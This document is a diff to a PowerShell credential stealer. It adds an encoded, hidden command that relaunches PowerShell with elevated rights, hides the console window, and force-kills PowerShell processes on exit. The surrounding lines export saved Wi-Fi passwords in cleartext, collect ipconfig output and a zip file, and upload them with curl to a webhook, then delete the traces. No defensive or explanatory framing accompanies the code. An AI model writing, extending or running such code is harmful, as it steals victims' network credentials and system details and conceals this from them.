@@ -1,6 +1,7 @@
-
+# this is just to get uac bomb
+powershell -noni -w hidden -nop -e dwBoAGkAbABlACgALQBuAG8AdAAoAFsAUwBlAGMAdQByAGkAdAB5AC4AUAByAGkAbgBjAGkAcABhAGwALgBXAGkAbgBkAG8AdwBzAFAAcgBpAG4AYwBpAHAAYQBsAF0AWwBTAGUAYwB1AHIAaQB0AHkALgBQAHIAaQBuAGMAaQBwAGEAbAAuAFcAaQBuAGQAbwB3AHMASQBkAGUAbgB0AGkAdAB5AF0AOgA6AEcAZQB0AEMAdQByAHIAZQBuAHQAKAApACkALgBJAHMASQBuAFIAbwBsAGUAKABbAFMAZQBjAHUAcgBpAHQAeQAuAFAAcgBpAG4AYwBpAHAAYQBsAC4AVwBpAG4AZABvAHcAcwBCAHUAaQBsAHQASQBuAFIAbwBsAGUAXQA6ADoAQQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgApACkAewAgAHQAcgB5AHsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAcAB3AHMAaAAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIAAiAC0ATgBvAFAAcgBvAGYAaQBsAGUAIAAtAE4AbwBFAHgAaQB0ACAALQBDAG8AbQBtAGEAbgBkACAAJgAgACcAJAAoACQATQB5AEkAbgB2AG8AYwBhAHQAaQBvAG4ALgBNAHkAQwBvAG0AbQBhAG4AZAAuAEQAZQBmAGkAbgBpAHQAaQBvAG4AKQAnACIAIAAtAFcAbwByAGsAaQBuAGcARABpAHIAZQBjAHQAbwByAHkAIAAoAEcAZQB0AC0ATABvAGMAYQB0AGkAbwBuACkALgBQAGEAdABoACAALQBWAGUAcgBiACAAUgB1AG4AQQBzACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAHQAbwBwADsAIABlAHgAaQB0ACAAfQAgAGMAYQB0AGMAaAAgAHsAIABTAHQAYQByAHQALQBTAGwAZQBlAHAAIAAxACAAfQAgAH0AOwAgAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAnAFIAdQBuAG4AaQBuAGcAIABlAGwAZQB2AGEAdABlAGQAJwANAAoA
 Add-Type -Name Win -Namespace P -MemberDefinition '[DllImport("kernel32.dll")]public static extern System.IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(System.IntPtr hWnd,int nCmdShow);';$h=[P.Win]::GetConsoleWindow();[P.Win]::ShowWindow($h,2)
-
+# Hide cmd ^^
 
 $e="$env:LOCALAPPDATA\Temp"; netsh wlan export profile key=clear folder=$e | Out-Null; Get-ChildItem "$e\Wi-Fi*.xml" | %{$x=[xml](gc $_); "SSID:$($x.WLANProfile.SSIDConfig.SSID.name) | Password:$($x.WLANProfile.MSM.security.sharedKey.keyMaterial)"} > "$e\wifi.txt"
 
@@ -17,7 +18,7 @@ ipconfig /all | Out-File -FilePath "$e\ipcfg.txt" # save ipconfig as a file
 #send to discord
 
 #send http
-& curl.exe -F "content=Passwords for: $whoami_content | IP: $ip_add | @everyone" -F "file1=@$zip" -F "file2=@$e\wifi.txt" -F "file3=@$e\ipcfg.txt" $wh > $null 2>&1
+Start-Process curl.exe -F "content=Passwords for: $whoami_content | IP: $ip_add | @everyone" -F "file1=@$zip" -F "file2=@$e\wifi.txt" -F "file3=@$e\ipcfg.txt" $wh > $null 2>&1
 
 cls # clear console
 # cleanup
@@ -25,3 +26,5 @@ cls # clear console
 Remove-Item -Path "$e\wifi.txt"
 Remove-Item -Path "$e\ipcfg.txt"
 Remove-Item -Path "$zip"
+#exit quickly
+taskkill /F /IM pwsh.exe /IM powershell.exe 2>$null 
